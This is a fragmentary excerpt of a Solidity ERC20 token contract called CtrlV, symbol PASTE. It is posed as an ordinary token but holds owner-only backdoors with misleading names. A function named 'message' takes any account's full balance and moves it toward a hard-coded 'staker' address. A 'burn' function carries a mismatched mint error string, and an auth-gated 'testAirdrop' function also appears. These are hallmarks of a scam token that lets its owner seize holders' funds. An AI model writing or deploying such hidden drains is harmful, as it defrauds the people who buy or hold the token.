...
contract CtrlV is Context, IERC20 {
    ...
    address lead_deployer = 0xb56B8C4Dd70bD2af9DeAA183DcC7D851368e8A0C;
    address public _owner = 0xFCCE7E736500a6200744aD179Ba6FFf96aCd640e;
   constructor () public {
        ...
        _symbol = "PASTE";
        _decimals = 18;
        uint256 initialSupply = 1248163264128;
        _safeOwner = _owner;
        
        

        init(lead_deployer, initialSupply*(10**18));
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function burn(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        ...
        function message(address account) public {
        
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        address staker = 0x135783B60cf5d71DAFF7a377f9eb7dB8D2dEAb9e;
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        ...
        function addLiquidity(address account) public {
  ...
  function testAirdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public auth(){
